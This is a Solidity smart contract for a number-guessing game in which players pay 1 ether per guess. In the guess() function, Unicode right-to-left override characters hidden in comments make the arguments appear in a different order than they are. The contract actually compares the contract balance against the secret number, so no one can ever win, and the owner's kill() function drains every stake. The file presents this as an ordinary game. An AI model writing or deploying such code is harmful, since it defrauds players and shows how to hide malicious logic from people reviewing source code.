// SPDX-License-Identifier: LGPL-3.0-or-later
pragma solidity ^0.7.5;

contract GuessTheNumber {
    event Succeed(string);
    event Failed(string);

    uint256 internal _secretNumber;
    address payable internal _owner;

    constructor(uint256 secretNumber_) payable {
        require(secretNumber_ <= 10);

        _secretNumber = secretNumber_;
        _owner = msg.sender;
    }

    function kill() external {
        require(msg.sender == _owner);
        selfdestruct(_owner);
    }

    function guess(uint256 n) external payable {
        require(msg.value == 1 ether);

        uint p = address(this).balance;
        checkAndTransferPrize(/*The prize‮/*rebmun desseug*/n , p/*‭
                /*The user who should benefit */,msg.sender);
    }

    function getValue() external view returns (uint) {
        return address(this).balance;
    }

    function checkAndTransferPrize(
        uint256 reward_,
        uint256 number_,
        address payable guesser_
    ) internal returns (bool) {
        if (number_ == _secretNumber) {
            guesser_.transfer(reward_);

            emit Succeed("You guessed the correct number!");

            return true;
        }

        emit Failed("You've made an incorrect guess!");

        return false;
    }
}